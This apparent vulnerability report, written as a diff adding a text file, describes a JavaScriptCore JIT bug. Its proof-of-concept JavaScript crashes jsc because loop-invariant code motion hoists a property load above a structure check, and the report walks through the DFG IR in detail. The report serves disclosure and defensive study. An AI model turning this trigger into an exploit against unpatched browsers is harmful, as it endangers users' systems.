@@ -1,0 +1,82 @@
+While fuzzing JavaScriptCore, I encountered the following (modified and commented) JavaScript program which crashes jsc from current HEAD and release (/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc):
+
+    function v2(trigger) {
+        // Force JIT compilation.
+        for (let v7 = 0; v7 < 1000000; v7++) { }
+
+        if (!trigger) {
+            // Will synthesize .length, .callee, and Symbol.iterator.
+            // See ScopedArguments::overrideThings [1]
+            arguments.length = 1;
+        }
+
+        for (let v11 = 0; v11 < 10; v11++) {
+            // The for-of loop (really the inlined array iterator) will fetch the
+            // .length property after a StructureCheck. However, the property fetch
+            // will be hoisted in front of the outer loop by LICM but the
+            // StructureCheck won't. Then, in the final invocation it will crash
+            // because .length hasn't been synthezised yet (and thus the butterfly
+            // is nullptr).
+            for (const v14 of arguments) {
+                const v18 = {a:1337};
+                // The with statement here probably prevents escape analysis /
+                // object allocation elimination from moving v18 into the stack,
+                // thus forcing DFG to actually allocate v18. Then, LICM sees a
+                // write to structure IDs (from the object allocation) and thus
+                // cannot hoist the structure check (reading a structure ID) in
+                // front of the loop.
+                with (v18) { }
+            }
+        }
+    }
+
+    for (let v23 = 0; v23 < 100; v23++) {
+        v2(false);
+    }
+
+    print("Triggering crash");
+    v2(true);
+
+
+Here is what appears to be happening:
+
+When v2 is optimized by the FTL JIT, it will inline the ArrayIterator.next function for the for-of loop and thus produce the following DFG IR (of which many details were omitted for readability):
+
+    Block #8 (Before outer loop)
+        ...
+
+    Block #10 (bc#180): 		(Outer loop)
+        104:<!0:-> CheckStructure(Check:Cell:@97, MustGen, [%Cp:Arguments], R:JSCell_structureID, Exits, bc#201, ExitValid)
+        105:< 2:-> GetButterfly(Cell:@97, Storage|UseAsOther, Other, R:JSObject_butterfly, Exits, bc#201, ExitValid)
+
+    Block #12 (bc#464 --> next#<no-hash>:<0x10a8a08c0> bc#43 --> arrayIteratorValueNext#<no-hash>:<0x10a8a0a00> bc#29):  (Inner loop header)
+        378:< 4:-> GetByOffset(Check:Untyped:@105, KnownCell:@97, JS|PureInt|UseAsInt, BoolInt32, id2{length}, 100, R:NamedProperties(2), Exits, bc#34, ExitValid)  predicting BoolInt32
+
+    Block #17 (bc#487): 		(Inner loop body)
+        267:< 8:-> NewObject(JS|UseAsOther, Final, %B8:Object, R:HeapObjectCount, W:HeapObjectCount, Exits, bc#274, ExitValid)
+        273:<!0:-> PutByOffset(KnownCell:@267, KnownCell:@267, Check:Untyped:@270, MustGen, id7{a}, 0, W:NamedProperties(7), ClobbersExit, bc#278, ExitValid)
+        274:<!0:-> PutStructure(KnownCell:@267, MustGen, %B8:Object -> %EQ:Object, ID:45419, R:JSObject_butterfly, W:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoFlags,JSCell_typeInfoType, ClobbersExit, bc#278, ExitInvalid)
+
+Eventually, the loop-invariant code motion optimization runs [2], changing graph to the following:
+
+    Block #8 (Before outer loop)
+        ...
+        105:< 2:-> GetButterfly(Cell:@97, Storage|UseAsOther, Other, R:JSObject_butterfly, Exits, bc#201, ExitValid)
+        378:< 4:-> GetByOffset(Check:Untyped:@105, KnownCell:@97, JS|PureInt|UseAsInt, BoolInt32, id2{length}, 100, R:NamedProperties(2), Exits, bc#34, ExitValid)  predicting BoolInt32
+
+    Block #10 (bc#180): 		(Outer loop)
+        104:<!0:-> CheckStructure(Check:Cell:@97, MustGen, [%Cp:Arguments], R:JSCell_structureID, Exits, bc#201, ExitValid)
+
+    Block #12 (bc#464 --> next#<no-hash>:<0x10a8a08c0> bc#43 --> arrayIteratorValueNext#<no-hash>:<0x10a8a0a00> bc#29):  (Inner loop header)
+
+    Block #17 (bc#487): 		(Inner loop body)
+        267:< 8:-> NewObject(JS|UseAsOther, Final, %B8:Object, R:HeapObjectCount, W:HeapObjectCount, Exits, bc#274, ExitValid)
+        273:<!0:-> PutByOffset(KnownCell:@267, KnownCell:@267, Check:Untyped:@270, MustGen, id7{a}, 0, W:NamedProperties(7), ClobbersExit, bc#278, ExitValid)
+        274:<!0:-> PutStructure(KnownCell:@267, MustGen, %B8:Object -> %EQ:Object, ID:45419, R:JSObject_butterfly, W:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoFlags,JSCell_typeInfoType, ClobbersExit, bc#278, ExitInvalid)
+
+
+Here, the GetButterfly and GetByOffset operations, responsible for loading the .length property, were moved in front of the StructureCheck which is supposed to ensure that .length can be loaded in this way. This is clearly unsafe and will lead to a crash in the final invocation of the function when .length is not "synthesized" and thus the butterfly is nullptr.
+
+To understand why this happens it is necessary to look at the requirements for hoisting operations [3]. One of them is that "The node doesn't read anything that the loop writes.". In this case the CheckStructure operation reads the structure ID from the object ("R:JSCell_structureID" in the IR above) and the PutStructure writes a structure ID ("W:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoFlags,JSCell_typeInfoType") as such the check cannot be hoisted because DFG cannot prove that the read value doesn't change in the loop body (note that here the compiler acts conservatively as it could, in this specific instance, determine that the structure ID being written to inside the loop is definitely not the one being read. It doesn't do so and instead only tracks abstract "heap locations" like the JSCell_structureID). However, as no operation in the loop bodies writes to either the JSObject_butterfly or the NamedProperties heap location (i.e. no Butterfly pointer or NamedProperty slot is ever written to inside the loop body), LICM incorrectly determined that the GetButterfly and GetByOffset operations could safely be hoisted in front of the loop body. See also https://bugs.chromium.org/p/project-zero/issues/detail?id=1775 and https://bugs.chromium.org/p/project-zero/issues/detail?id=1789 for more information about the LICM optimization.
+
+I suspect that this issue is more general (not limited to just `argument` objects) and allows bypassing of various StructureChecks in the JIT, thus likely being exploitable in many ways. However, I haven't confirmed that.
